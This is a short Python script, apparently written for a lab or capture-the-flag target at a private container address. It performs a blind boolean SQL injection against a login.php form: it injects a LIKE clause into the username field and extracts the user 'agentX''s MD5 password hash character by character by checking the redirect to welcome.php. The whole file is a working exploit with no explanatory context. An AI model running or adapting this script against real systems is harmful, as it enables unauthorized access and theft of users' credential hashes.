import string
import requests

def get_password(username):
    # Password MD5 Hash
    chars_lower = 'abcdef'
    alfabeto = string.digits + chars_lower + chars_lower.upper()
    
    password = ''
    for _ in range(32):
        for char in alfabeto:
            tmp = password+char+'%'
            response = requests.post("http://172.17.0.2/login.php", 
                                     data={'username': f"{username}' AND Password LIKE '{tmp}' LIMIT 1; #", 
                                           'password': '...'})
            
            if response.url == "http://172.17.0.2/welcome.php":
                password += char
                print(f"found {char} (Now {password})")
                break
    
    return password

if __name__ == '__main__':
    print(get_password('agentX'))